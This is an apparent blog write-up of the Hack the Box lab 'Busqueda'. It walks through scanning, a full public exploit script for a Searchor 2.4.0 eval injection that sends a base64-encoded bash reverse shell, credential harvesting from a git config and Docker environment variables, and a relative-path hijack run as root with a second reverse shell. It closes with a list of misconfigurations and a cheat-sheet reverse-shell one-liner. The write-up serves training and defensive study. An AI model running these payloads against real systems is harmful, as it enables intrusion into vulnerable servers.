---
title: Busqueda (Hack the Box)
author: Robin Goyal
date: 2023-12-27
categories: [Cybersecurity, Writeups]
tags: []
image:
  src: https://labs.hackthebox.com/storage/avatars/a6942ab57b6a79f71240420442027334.png
---

![](/assets/img/htb-banner.png)

<img src="{{ page.image.src }}" style="margin-right: 40px; margin-left: 20px; zoom: 50%;" align=left />    	

### {{ page.title }}

**Difficulty**: `easy`

**User Flag**: `117c6186402839607f9ee81028b04f09`

**Root Flag**: `2ba2fe076ce54528eb9ed736e05fb7c1`

<br>
<hr>
<br>


## Enumeration

```
# nmap -p 22,80 -sC -sV -oN tcp_22_80_scan.nmap 10.129.200.121
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 12:06 EDT
Nmap scan report for searcher.htb (10.129.200.121)
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial Foothold

### 80 - HTTP

Append `10.129.212.124 searcher.htb` to `/etc/hosts`

```
# curl -I http://searcher.htb
HTTP/1.1 200 OK
Date: Sun, 28 May 2023 16:10:13 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Content-Length: 13519
```

![](/assets/img/posts/htb-busqueda/website-searcher-2.4.0.png)

The web application is hosted on a Werkzeug server and running Searchor 2.4.0 which is vulnerable to a CLI eval injection in Python. This information can be found from the patch notes and the code diffs in Searchor's git repo for 2.4.2.

![](/assets/img/posts/htb-busqueda/website-searchor-2.4.2-patch.png)

![](/assets/img/posts/htb-busqueda/vuln-git-commit-fix.png)

Below is a valid [exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh) for this vulnerability: 

```bash
#!/bin/bash -

default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
plus="+"

echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"

if [ -z "${evil_cmd##*$plus*}" ]
then
    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
fi

if [ $# -ne 0 ]
then
    echo "[*] Input target is $1"
    echo "[*] Input attacker is $2:${port}"
    echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
    curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
else 
    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example: 

./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
fi
```

No changes need to be made to the exploit code. Download the code, append the execute permissions bit `chmod +x exploit.sh`, start a netcat listener, and run the exploit code to catch the reverse shell ...

![](/assets/img/posts/htb-busqueda/revshell.png)

as the `svc` user. With shell as a lower privileged user, time to enumerate the system for any privesc vectors!


## Privilege Escalation

### Git Config

The Apache web server config contains another vhost. 

```bash
svc@busqueda:~$ cat /etc/apache2/sites-available/000-default.conf 
<VirtualHost *:80>
        ProxyPreserveHost On
        ServerName searcher.htb
        ServerAdmin admin@searcher.htb
        ProxyPass / http://127.0.0.1:5000/
        ProxyPassReverse / http://127.0.0.1:5000/

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^searcher.htb$
        RewriteRule /.* http://searcher.htb/ [R]

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

<VirtualHost *:80>
        ProxyPreserveHost On
        ServerName gitea.searcher.htb
        ServerAdmin admin@searcher.htb
        ProxyPass / http://127.0.0.1:3000/
        ProxyPassReverse / http://127.0.0.1:3000/

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

Listing the listening ports on the host

```bash
svc@busqueda:~$ ss -tuln

Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                                                          
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*                                                                                                    
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*                                                                                                    
tcp   LISTEN 0      4096       127.0.0.1:45861      0.0.0.0:*                                                                                                    
tcp   LISTEN 0      128        127.0.0.1:5000       0.0.0.0:*                                     
tcp   LISTEN 0      4096       127.0.0.1:3306       0.0.0.0:*                                                                
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                                
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                                
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*                                                                
tcp   LISTEN 0      4096       127.0.0.1:222        0.0.0.0:*                                                                
tcp   LISTEN 0      511                *:80               *:*                                                                
tcp   LISTEN 0      128             [::]:22            [::]:*
```

Two services listening on ports 3000 and 5000 which Apache is proxying the requests to. Since there's a Gitea service listening on port 3000, there may be git configuration stored in the .gitconfig file. 

```bash
svc@busqueda:~$ cat ~/.gitconfig 
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

Nothing here but there is a .git folder located in /var/www/app. The config file there does contain sensitive information ...

```bash
svc@busqueda:/var/www/app$ cat .git/config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

There is a configured password for `cody` to the Gitea server which also is the password for the system `svc` account. 

### Sudo Privileges

```bash
svc@busqueda:/var/www/app$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

`svc` can run the command `/usr/bin/python3 /opt/scripts/system-checkup.py *` as `root`. 

```bash
svc@busqueda:/var/www/app$ ls -la /opt/scripts
ls -la /opt/scripts
total 28
drwxr-xr-x 3 root root 4096 Dec 24  2022 .
drwxr-xr-x 4 root root 4096 Mar  1  2023 ..
-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
drwxr-x--- 8 root root 4096 Apr  3  2023 .git
-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py
```

`svc` can't read the contents of the file but can execute it. 

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

The system-checkup.py script will run three different actions, two of which are system commands (`docker-ps`, `docker-inspect`), and the third matching the full-checkup.sh script in the `/opt/scripts` directory. 

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

`docker-ps` will list the running containers and `docker-inspect` should list the details of a container including any environment variables. Since there is a gitea and a MySQL container running, there might be environment variable secrets in one of these containers. 

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

The `docker-inspect` action requires a format argument and container name.

{% raw %}
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect "{{json .Config.Env}}" gitea | jq .
[
  "USER_UID=115",
  "USER_GID=121",
  "GITEA__database__DB_TYPE=mysql",
  "GITEA__database__HOST=db:3306",
  "GITEA__database__NAME=gitea",
  "GITEA__database__USER=gitea",
  "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
  "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
  "USER=git",
  "GITEA_CUSTOM=/data/gitea"
]
```
{% endraw %}

{% raw %}
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect "{{json .Config.Env}}" mysql_db | jq .
[
  "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
  "MYSQL_USER=gitea",
  "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
  "MYSQL_DATABASE=gitea",
  "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
  "GOSU_VERSION=1.14",
  "MYSQL_MAJOR=8.0",
  "MYSQL_VERSION=8.0.31-1.el8",
  "MYSQL_SHELL_VERSION=8.0.31-1.el8"
]
```
{% endraw %}

### MySQL Access

Authenticating to the MySQL instance with the `gitea:jI86kGUuj87guWr3RyF` credentials into the mysql instance and dumping the users table in the gitea database, there is an adminstrator user alongside cody for the Gitea server. 

```bash
svc@busqueda:/var/www/app$ mysql -h 127.0.0.1 -u root -pjI86kGUuj87guWr3RyF gitea
mysql> select email from user;
+----------------------------------+
| email                            |
+----------------------------------+
| administrator@gitea.searcher.htb |
| cody@gitea.searcher.htb          |
+----------------------------------+
2 rows in set (0.00 sec)
```

### Gitea Access and Source Code

Once logged into the Gitea server with the administrator account and the Gitea MySQL database password `administrator:yuiu1hoiu4i5ho1uh`, the scripts found earlier can be read in their entirety.

Viewing the snippet of code in system-checkup.py for the full-checkup script,

```
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

This script can be ran from the `/opt/scripts` directory since it is looking for the full-checkup.sh script using a relative path. 

```
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
[=] Docker conteainers
{
  "/gitea": "running"
}
{
  "/mysql_db": "running"
}

[=] Docker port mappings
{
  "22/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "222"
    }
  ],
  "3000/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "3000"
    }
  ]
}

[=] Apache webhosts
[+] searcher.htb is up
[+] gitea.searcher.htb is up

[=] PM2 processes
┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ app    │ default     │ N/A     │ fork    │ 1438     │ 111m   │ 0    │ online    │ 0%       │ 30.2mb   │ svc      │ disabled │
└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

[+] Done!
```

### RCE as root

The script runs! 

Thinking about this though, the system-checkup.py script ran with the full-checkup argument runs the full-checkup.sh script ... but from the current directory. If there is a full-checkup.sh script located elsewhere, the user will have arbitrary command execution as root.

With the following reverse shell payload script and a netcat listener spun up, running the previous command will send a shell to the attack box.

```
#!/bin/bash

bash -c "bash -i >&/dev/tcp/<IP>/4444 0>&1"
```

![](assets/img/posts/htb-busqueda/root-shell.png)

With root, there is full shell access!


## Reflection

A reflection of what was learned through this box. 

## Useful Commands

**Bash Reverse Shell**: `bash -c "bash -i >&/dev/tcp/<IP>/4444 0>&1"`
**Connect to a MySQL server and select a database**: `mysql -h 127.0.0.1 -u root -pjI86kGUuj87guWr3RyF gitea`
{% raw %}
**Inspect environment variables of Docker container**: `docker-inspect "{{json .Config.Env}}" gitea`
{% endraw %}

### Killchain Summary

1. Public exploit for a Python module (Searchor 2.4.0) with a CLI eval injection vulnerability
2. Find password for a lower privilege system account in a Git config file
3. The service account user can execute a system checkup script for the services with root privileges
4. Enumerate environment variables of Docker services with additional credentials
5. Use the credentials to authenticate to the Gitea server as an administrator and view the source code for all scripts
6. The system checkup script runs a full checkup script as well using a relative path which can be abused for RCE as root

### Misconfigurations

Some misconfigurations on this host that led us to have root access:
- not using updated versions of open source modules
- saving credentials in world-readable files
- reusing credentials for system accounts
- enabling a lower privileged user to execute system commands that can leak sensitive information
- using a relative path in a script that has root privileges

### Summary of Exploit(s)

The exploit used takes advantage of an eval code injection vulnerability. The snippet of code that contains the vulnerability: 

```python
@click.argument("engine")
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
        if copy:
            click.echo("link copied to clipboard")
    except AttributeError:
        print("engine not recognized")
```

The function will accept two required arguments through the web application, engine and query. Since the engine is an attribute of the Engine class, the injection point will be in the query parameter. 

If the engine is Google and the query is `'), __import__("os").getcwd()" #`, this will be executed as `f"Engine.Google.search(''), __import__("os").getcwd()" #', copy_url={copy}, open_web={open})"`

The eval function will execute the entire string (`Engine.Google.search(''), __import__("os").getcwd()`) and the return will be a tuple with the result of both commands. Finally, the rest of the string in the eval call is ignored due to the `#`. 

With the injection point, an arbitrary payload can be used. The exploit used a base64 encoded reverse shell payload that led to system access as the `svc` user. 

## Conclusion

This was a fun easy difficulty box that involved exploiting a Python eval injection vulnerability and a relative path reference leading to RCE as root. Although I used an already existing exploit, I think I could have written the exploit myself. With the source code as well as the patch notes on Github, this was very doable even with limited exploit development experience. 

Overall, this box was well-done and seems realistic enough that an administrator would configure it in the same way for a production system. 